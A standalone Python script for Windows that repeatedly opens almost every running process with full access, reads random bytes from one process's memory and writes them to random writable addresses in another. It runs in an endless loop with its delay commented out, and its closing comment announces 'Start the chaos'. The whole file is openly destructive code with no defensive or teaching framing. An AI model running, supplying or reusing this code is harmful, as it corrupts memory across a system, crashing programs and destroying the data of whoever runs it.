import os
import threading
import random
import time
import psutil
import ctypes
from ctypes import wintypes

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

# List of process name prefixes to affect
TARGET_PROCESS_NAMES = "abcdefghijklmnopqrstuvwxyz"


# Structures for memory query
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]


# Open a process and return its handle
def open_process(pid):
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not handle:
        raise ctypes.WinError()
    return handle


# Get writable memory regions of a process
def get_writable_memory_regions(handle):
    address = 0
    regions = []
    mbi = MEMORY_BASIC_INFORMATION()
    while ctypes.windll.kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi),
                                                ctypes.sizeof(mbi)):
        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_READWRITE:
            regions.append((mbi.BaseAddress, mbi.RegionSize))
        address += mbi.RegionSize
    return regions


# Get readable memory regions of a process
def get_readable_memory_regions(handle):
    address = 0
    regions = []
    mbi = MEMORY_BASIC_INFORMATION()
    while ctypes.windll.kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi),
                                                ctypes.sizeof(mbi)):
        if mbi.State == MEM_COMMIT and (mbi.Protect & PAGE_READWRITE):
            regions.append((mbi.BaseAddress, mbi.RegionSize))
        address += mbi.RegionSize
    return regions


# Read random memory from the process
def read_random_memory(handle):
    # Get readable memory regions
    regions = get_readable_memory_regions(handle)
    if not regions:
        raise ValueError("No readable memory regions found")

    # Choose a random region and address
    base_address, region_size = random.choice(regions)
    address = base_address + random.randint(0, region_size - 1)

    # Determine the size to read
    size = random.randint(1, min(1024, region_size))
    buffer = (ctypes.c_char * size)()
    bytes_read = ctypes.c_size_t(0)

    # Read the memory from the process
    if not ctypes.windll.kernel32.ReadProcessMemory(handle, ctypes.c_void_p(address), buffer, size,
                                                    ctypes.byref(bytes_read)):
        raise ctypes.WinError()

    print(f"Read {bytes_read.value} bytes from address {hex(address)}")
    return buffer[:bytes_read.value]


# Write random bytes to a random address in the process's memory
def write_random_memory(handle, data):
    # Get writable memory regions
    regions = get_writable_memory_regions(handle)
    if not regions:
        raise ValueError("No writable memory regions found")

    # Choose a random region and address
    base_address, region_size = random.choice(regions)
    address = base_address + random.randint(0, region_size - 1)

    # Determine the size to write
    size = len(data)
    buffer = (ctypes.c_char * size).from_buffer_copy(data)

    # Write the buffer to the process's memory
    written = ctypes.c_size_t(0)
    if not ctypes.windll.kernel32.WriteProcessMemory(handle, ctypes.c_void_p(address), buffer, size,
                                                     ctypes.byref(written)):
        raise ctypes.WinError()

    print(f"Wrote {written.value} bytes to address {hex(address)}")


# Function to randomly manipulate memory of a process
def manipulate_process_memory():
    try:
        # Get a list of all running processes
        processes = [p for p in psutil.process_iter(['pid', 'name']) if p.info['pid'] != os.getpid()]
        if len(processes) < 2:
            raise ValueError("Not enough processes to perform the operation")

        # Filter processes based on defined name prefixes (case insensitive)
        matching_processes = [p for p in processes if
                              any(p.info['name'].lower().startswith(prefix.lower()) for prefix in TARGET_PROCESS_NAMES)]
        if len(matching_processes) < 2:
            raise ValueError("Not enough matching processes to perform the operation")

        # Select a random process to read from
        source_process = random.choice(matching_processes)
        print(f"Selected source process PID: {source_process.info['pid']} ({source_process.info['name']})")

        # Open the source process
        handle1 = open_process(source_process.info['pid'])

        # Read random memory from the source process
        data = read_random_memory(handle1)

        # Close the source process handle
        ctypes.windll.kernel32.CloseHandle(handle1)

        # Filter target processes excluding the source process
        target_processes = [p for p in matching_processes if p.info['pid'] != source_process.info['pid']]
        if not target_processes:
            raise ValueError("No target processes found to write to")

        # Select a random target process
        target_process = random.choice(target_processes)
        print(f"Selected target process PID: {target_process.info['pid']} ({target_process.info['name']})")

        # Open the target process
        handle2 = open_process(target_process.info['pid'])

        # Write random memory to the target process
        write_random_memory(handle2, data)

        # Close the target process handle
        ctypes.windll.kernel32.CloseHandle(handle2)

    except Exception as e:
        print(f"Error: {e}")


# Function to monitor for new processes and manipulate their memory
def random_memory_manipulation():
    while True:
        try:
            manipulate_process_memory()
        except Exception as e:
            print(f"Error: {e}")

        # Sleep for a short period before checking again
       # time.sleep(random.uniform(1, 5))


# Start the chaos
if __name__ == "__main__":
    random_memory_manipulation()
